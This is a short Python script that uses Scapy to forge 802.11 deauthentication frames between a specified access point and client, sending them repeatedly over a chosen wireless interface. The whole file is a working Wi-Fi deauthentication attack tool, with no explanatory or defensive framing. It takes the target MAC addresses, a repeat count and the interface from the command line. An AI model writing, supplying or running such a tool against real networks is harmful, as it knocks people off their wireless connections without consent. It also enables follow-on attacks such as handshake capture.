from scapy.all import *
import sys




def perform_deauth(ap, client, count, nic):
# Deauthentication Packet For Access Point
    pkt_to_ap = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()

# Deauthentication Packet For Client
    pkt_to_c = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()


    while count != 0:
        for i in range(50):

            print ("sending client to ap")
            sendp(pkt_to_ap, iface=nic)
            print ("sending ap to client")
            sendp(pkt_to_c, iface=nic)


        count-=1



if __name__ == "__main__":

	print (sys.argv[1],sys.argv[2],sys.argv[3])
	perform_deauth(sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4])

